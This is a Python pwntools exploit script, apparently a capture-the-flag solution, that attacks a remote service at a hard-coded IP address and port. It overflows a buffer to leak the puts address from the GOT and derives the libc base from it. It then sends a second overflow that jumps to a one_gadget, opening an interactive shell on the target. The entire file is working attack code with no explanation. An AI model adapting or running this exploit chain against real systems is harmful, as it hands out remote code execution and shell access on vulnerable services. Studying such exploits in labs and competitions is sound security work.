#!/usr/bin/env python3
from pwn import *

conn = remote('46.101.107.117', 2113)

# Leak libc base address
payload = b'B' * 13
payload += p32(0x8048480)		# puts@plt
payload += p32(0x80485e6)		# main
payload += p32(0x804a020)		# puts@got.plt

conn.sendline(payload)
conn.recvuntil('Mariner\n\n')
data = conn.recv(4)

puts_addr = int.from_bytes(data, 'little')
log.info('puts_addr: ' + hex(puts_addr))

libc_base = puts_addr - 0x67460			# puts_offset = 0x67460
log.info('libc_base: ' + hex(libc_base))

# Overwrite return address with 0x3ccea
one_gadget = 0x3ccea
payload = b'B' * 13
payload += p32(libc_base + one_gadget)
conn.sendline(payload)

conn.interactive()
